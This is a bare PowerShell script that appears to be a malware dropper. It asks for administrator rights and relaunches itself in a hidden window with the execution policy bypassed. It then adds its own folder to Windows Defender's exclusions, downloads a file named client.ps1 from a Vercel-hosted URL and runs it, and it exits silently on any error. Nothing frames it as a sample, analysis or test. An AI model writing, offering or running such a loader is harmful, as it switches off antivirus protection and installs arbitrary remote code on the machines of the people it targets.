if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arg = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"" + $MyInvocation.MyCommand.Definition + "`""
    Start-Process -FilePath "powershell" -ArgumentList $arg -Verb RunAs
    exit
}

$pathToExclude = if ($PSScriptRoot -and $PSScriptRoot -ne "") { $PSScriptRoot } else { (Get-Location).Path }

try {
    Add-MpPreference -ExclusionPath $pathToExclude
    $Url = "https://my-nextjs-app-8r12.vercel.app/api/download"
    $file = "client.ps1"
    $full = Join-Path -Path $pathToExclude -ChildPath $file
    Invoke-WebRequest -Uri $Url -OutFile $full
    . $full
} catch {
	exit(0)
}